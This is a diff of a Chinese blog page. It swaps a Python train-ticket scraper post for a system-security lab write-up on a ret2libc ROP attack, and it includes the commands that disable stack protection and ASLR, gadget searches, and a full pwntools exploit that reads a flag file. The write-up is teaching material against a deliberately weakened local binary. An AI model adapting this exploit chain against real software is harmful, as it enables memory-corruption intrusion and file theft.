class="token punctuation">]</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> lst
+  setreuid(geteuid(), geteuid());
+  setvbuf(stdout, NULL, _IONBF, 0);//直接从流中读入数据或者直接向流中写入数据，而没有缓冲区
+  setvbuf(stdin, NULL, _IONBF,0);
 
+  start();
 
-<span class="token comment" spellcheck="true">#获取车站名称信息，即’车站名‘和’车站名简称‘的对应表</span>
-<span class="token keyword">def</span> <span class="token function">getStation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    url <span class="token operator">=</span> <span class="token string">'https://kyfw.12306.cn/otn/resources/js/framework/station_name.js?station_version=1.9204'</span>
-    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 Edg/94.0.992.31'</span><span class="token punctuation">}</span>
-    resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-    resp<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span>
-        <span class="token comment" spellcheck="true">#print(resp.text)</span>
-    <span class="token comment" spellcheck="true">#获取指定格式的字串</span>
-    stationList<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'([\u4e00-\u9fa5]+)\|([A-Z]+)'</span><span class="token punctuation">,</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#正则表达式，[\u4e00-\u9fa5]代表全部的汉字</span>
-        <span class="token comment" spellcheck="true">#print(stationList)</span>
-    <span class="token comment" spellcheck="true">#返回的stationList是列表，需要转成字典</span>
-    nameDic<span class="token operator">=</span>dict<span class="token punctuation">(</span>stationList<span class="token punctuation">)</span>
-        <span class="token comment" spellcheck="true">#print(nameDic)</span>
-    <span class="token comment" spellcheck="true">#进行键值呼唤</span>
-    anti_nameDic<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">#空字典，用于将key和value进行交换</span>
-    <span class="token keyword">for</span> item <span class="token keyword">in</span> nameDic<span class="token punctuation">:</span>
-        anti_nameDic<span class="token punctuation">[</span>nameDic<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span>item
-    <span class="token keyword">return</span> anti_nameDic
-
-
-<span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token comment" spellcheck="true">#得到车次信息</span>
-    lst<span class="token operator">=</span>parseJson<span class="token punctuation">(</span>sendRequset<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>getStation<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token comment" spellcheck="true">#筛选，去除无票车次</span>
-    <span class="token keyword">for</span> item <span class="token keyword">in</span> lst<span class="token punctuation">:</span>
-        <span class="token keyword">if</span> item<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'无'</span> <span class="token operator">and</span> item<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">''</span><span class="token punctuation">:</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>
-
-
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    <span class="token comment" spellcheck="true">#getStation()</span>
-    start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+  return 0;
+}
 </code></pre>
+<h2 id="编译-amp-系统选项"><a href="#编译-amp-系统选项" class="headerlink" title="编译 &amp; 系统选项"></a>编译 &amp; 系统选项</h2><ul>
+<li><p>stack保护(<code>stack canary</code>)，默认开启</p>
+<ul>
+<li><code>-fno-stack-protector / -fstack-protector</code></li>
+</ul>
+</li>
+<li><p><code>NX(No-eXecute)</code>，默认开启</p>
+<ul>
+<li><p>即不可执行保护</p>
+</li>
+<li><p><code>-z execstack</code></p>
 </li>
 </ul>
 </li>
+<li><p><code>PIE</code>，默认开启</p>
+<ul>
+<li>每次加载程序时变换加载地址</li>
+<li><code>-no-pie / -pie</code></li>
 </ul>
+</li>
+<li><p>32位编译选项</p>
+<ul>
+<li><code>-m32</code></li>
+</ul>
+</li>
+<li><p><code>ASLR</code>设置</p>
+<ul>
+<li><code>sudo sysctl -w kernel.randomize_va_space= 0关闭 / 2开启)</code></li>
+</ul>
+</li>
+</ul>
+<pre><code>#完整的编译指令
+gcc -m32 stack.c -o stack -fno-stack-protector
+</code></pre>
+<p>Tips：使用<strong>“-m32”</strong>可能会报错<strong>“/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h”</strong>，原因是gcc安装环境没有安装完善，使用<code>sudo apt install gcc-multilib</code>即可解决。</p>
+<h1 id="执行步骤"><a href="#执行步骤" class="headerlink" title="执行步骤"></a>执行步骤</h1><h2 id="cyclic获取溢出点"><a href="#cyclic获取溢出点" class="headerlink" title="cyclic获取溢出点"></a>cyclic获取溢出点</h2><p>进入<code>pwngdb</code>，使用<code>cyclic 100</code>生成100字节的字符串作为程序输入</p>
+<pre><code>$ gdb ./stack
+pwndbg&gt; cyclic 100
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+pwndbg&gt; run
+Starting program: /home/kali/Desktop/SysSecurity/stack
+IOLI Crackme Level 0x00
+Password:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+</code></pre>
+<p>观察到程序崩溃并给出一个无效地址</p>
+<p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420194344949.png" alt="image-20220420194344949"></p>
+<p>用改地址回到cyclic进行比较，可以知道溢出点位置为76</p>
+<p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420194503718.png" alt="image-20220420194503718"></p>
+<h2 id="获取PR-x2F-PPR-x2F-PPPR的地址"><a href="#获取PR-x2F-PPR-x2F-PPPR的地址" class="headerlink" title="获取PR/PPR/PPPR的地址"></a>获取PR/PPR/PPPR的地址</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42750240/article/details/121989094?ops_request_misc=%7B%22request_id%22:%22165043814016780265485394%22,%22scm%22:%2220140713.130102334..%22%7D&amp;request_id=165043814016780265485394&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121989094.142%5Ev9%5Epc_search_result_control_group,157%5Ev4%5Econtrol&amp;utm_term=rop%E6%98%AF%E4%BB%80%E4%B9%88&amp;spm=1018.2226.3001.4187"> 什么是ROP系统攻击</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44932880/article/details/103692899">通用gadget详解</a></p>
+<p>（一个P对应一个参数，在使用了某个函数后需要使用POP指令将其参数从栈中弹出）</p>
+<pre><code>ropper --file ./stack | grep "pop" | grep "ret"
+</code></pre>
+<p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420194932505.png!%5Bimage-20220420195013287%5D(ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420195013287.png" alt="image-20220420194932505"></p>
+<p>这是这几个gadget在程序中的<strong>偏移地址</strong>，在使用时需要加上程序加载的基地址。</p>
+<h2 id="获取lib加载地址"><a href="#获取lib加载地址" class="headerlink" title="获取lib加载地址"></a>获取lib加载地址</h2><p>在<code>pwndbg</code>中使用<code>print</code></p>
+<p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420195237389.png" alt="image-20220420195237389"></p>
+<p>再通过<code>readelf</code>工具获取上述函数在<code>libc</code>中的偏移地址，想减计算出<code>libc</code>的加载地址</p>
+<p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420195514093.png" alt="image-20220420195514093"></p>
+<h2 id="获取程序加载地址"><a href="#获取程序加载地址" class="headerlink" title="获取程序加载地址"></a>获取程序加载地址</h2><p>通过查找程序中特殊字符串的<strong>地址</strong>和<strong>偏移地址</strong>相减，获得程序加载地址</p>
+<pre><code>#在命令行中
+ropper --file ./stack --string "Password OK"
+</code></pre>
+<p>得到偏移地址</p>
+<p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420195808275.png" alt="image-20220420195808275"></p>
+<pre><code>#在pwndbg中
+b main        #在main函数前设置断点
+run
+search "Password OK"
+</code></pre>
+<p>得到字符串执行时的地址</p>
+<p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420200015846.png" alt="image-20220420200015846"></p>
+<h2 id="完成攻击脚本"><a href="#完成攻击脚本" class="headerlink" title="完成攻击脚本"></a>完成攻击脚本</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./stack"</span><span class="token punctuation">)</span>
+
+PR <span class="token operator">=</span> <span class="token number">0x0000138b</span>
+PPR <span class="token operator">=</span> <span class="token number">0x0000138a</span>
+PPPR <span class="token operator">=</span> <span class="token number">0x00001389</span>
+
+<span class="token comment" spellcheck="true">#字符填充</span>
+payload <span class="token operator">=</span> b<span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">76</span>
+
+<span class="token comment" spellcheck="true">#根据system地址获取libc加载地址</span>
+system_addr <span class="token operator">=</span> <span class="token number">0xf7dfdd00</span>
+system_offset <span class="token operator">=</span> <span class="token number">0x00044cc0</span>
+libc_load_addr <span class="token operator">=</span> system_addr <span class="token operator">-</span> system_offset
+
+<span class="token comment" spellcheck="true">#用到函数的地址</span>
+printf_addr <span class="token operator">=</span> <span class="token number">0xf7e0cf10</span>
+open_addr <span class="token operator">=</span> <span class="token number">0xf7eaa770</span>
+write_addr <span class="token operator">=</span> <span class="token number">0xf7eaad50</span>
+read_addr <span class="token operator">=</span> <span class="token number">0xf7eaac90</span>
+puts_addr <span class="token operator">=</span> <span class="token number">0xf7e284e0</span>
+gets_addr <span class="token operator">=</span> <span class="token number">0xf7e27a00</span>
+exit_addr <span class="token operator">=</span> <span class="token number">0xf7df0680</span>
+
+<span class="token comment" spellcheck="true">#bss段地址，可通过readelf -S ./stack查看</span>
+bss_offset <span class="token operator">=</span> <span class="token number">0x00004038</span>
+<span class="token comment" spellcheck="true">#bss2手动设置的缓冲区</span>
+bss2_offset <span class="token operator">=</span> <span class="token number">0x00004038</span> <span class="token operator">+</span> <span class="token number">20</span>
+passwd_ok_offset <span class="token operator">=</span> <span class="token number">0x00002031</span>
+passwd_ok_addr <span class="token operator">=</span> <span class="token number">0x56557031</span>
+load_addr <span class="token operator">=</span> passwd_ok_addr <span class="token operator">-</span> passwd_ok_offset
+
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>gets_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># gets</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>PR <span class="token operator">+</span> load_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss_offset <span class="token operator">+</span> load_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 读取数据到bss</span>
+
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># puts回显</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>PR <span class="token operator">+</span> load_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss_offset <span class="token operator">+</span> load_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 输出bss数据</span>
+
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>PPR <span class="token operator">+</span> load_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss_offset <span class="token operator">+</span> load_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 打开bss中的目标文件，即flag文件</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>PPPR<span class="token operator">+</span> load_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># “3”即时open函数得到的flag文件对应的句柄</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss2_offset <span class="token operator">+</span> load_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 读到bss2缓冲区</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>PPPR<span class="token operator">+</span> load_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 标准输出</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss2_offset <span class="token operator">+</span> load_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 将bss2缓冲区的数据输出到标准输出</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>exit_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>代码依次执行了<code>gets——&gt;puts——&gt;open——&gt;read——&gt;write</code>函数，执行了如下的功能</p>
+<ol>
+<li>gets函数读取程序员手动输入的文件路径，将其保存在<code>bss</code>中</li>
+<li>puts函数对<code>bss</code>中的数据进行输出（验证是否正确保存）</li>
+<li>open函数打开对应文件，得到文件句柄**”3”**</li>
+<li>read函数从文件中读取数据到<code>bss2</code>中</li>
+<li>write函数将<code>bss2</code>中的数据输出到标准输出</li>
+</ol>
+<p>执行结果如下所示：</p>
+<p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420201534875.png" alt="image-20220420201534875"></p>
+<h2 id="开启ASLR再次执行"><a href="#开启ASLR再次执行" class="headerlink" title="开启ASLR再次执行"></a>开启ASLR再次执行</h2><pre><code>#开启ASLR
+sudo sysctl -w kernel.randomize_va_space=2
+</code></pre>
+<p>发现无法正常执行</p>
+<p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420201841071.png" alt="image-20220420201841071"></p>
+<h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><p><a target="_blank" rel="noopener" href="https://qeryu.github.io/2022/04/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8lab1/">信息系统安全Lab1 - 胡思乱想集散中心 (qeryu.github.io)</a></p>
 
                 
             </div>
@@ -1071,7 +936,7 @@ pit<span class="token punctuation">.</span>savefig<span class="token punctuation
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://zhusuwen.github.io/2022/03/10/py%E7%88%AC%E8%99%AB/">http://zhusuwen.github.io/2022/03/10/py%E7%88%AC%E8%99%AB/</a>
+                    <a href="http://zhusuwen.github.io/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/">http://zhusuwen.github.io/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1108,11 +973,7 @@ pit<span class="token punctuation">.</span>savefig<span class="token punctuation
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/python/">
-                                    <span class="chip bg-color">python</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -1158,17 +1019,18 @@ pit<span class="token punctuation">.</span>savefig<span class="token punctuation
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/03/10/goNote/">
+                <a href="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="goNote">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                         
-                        <span class="card-title">goNote</span>
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1178,29 +1040,18 @@ pit<span class="token punctuation">.</span>savefig<span class="token punctuation
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-20
+                            </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/note/" class="post-category">
-                                    note
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            樱桃会长成樱花树吗
                             
                         </span>
                     </div>
                 </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/go/">
-                        <span class="chip bg-color">go</span>
-                    </a>
-                    
-                </div>
+
                 
             </div>
         </div>
@@ -1211,13 +1062,13 @@ pit<span class="token punctuation">.</span>savefig<span class="token punctuation
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/10/pyNote/">
+                <a href="/2022/03/10/goNote/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="pyNote">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="goNote">
                         
-                        <span class="card-title">pyNote</span>
+                        <span class="card-title">goNote</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1245,8 +1096,8 @@ pit<span class="token punctuation">.</span>savefig<span class="token punctuation
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/python/">
-                        <span class="chip bg-color">python</span>
+                    <a href="/tags/go/">
+                        <span class="chip bg-color">go</span>
                     </a>
                     
                 </div>
